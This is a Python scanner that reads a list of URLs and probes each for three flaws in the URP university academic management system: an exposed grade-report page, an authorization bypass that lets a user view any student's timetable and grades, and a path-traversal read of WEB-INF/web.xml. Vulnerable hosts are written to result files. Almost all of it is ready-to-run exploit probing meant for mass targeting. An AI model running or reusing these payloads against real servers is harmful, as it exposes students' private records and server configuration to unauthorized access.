
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/reportFiles/cj/cj_zwcjd.jsp"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"成绩单" in req.text:
            print("[+]存在urp查询接口曝露漏洞...(中危)\tpayload: " + vulnurl, "yellow")
            with open('接口曝露漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在urp_query漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/test1.jsp"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"jmglAction.do" in req.text:
            print("[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: " + vulnurl, "yellow")
            with open('越权漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在urp_query2漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if req.headers["Content-Type"] == "application/xml":
            print("[+]存在URP综合教务系统任意文件读取漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('任意文件读取漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在urp_ReadJavaScriptServlet漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")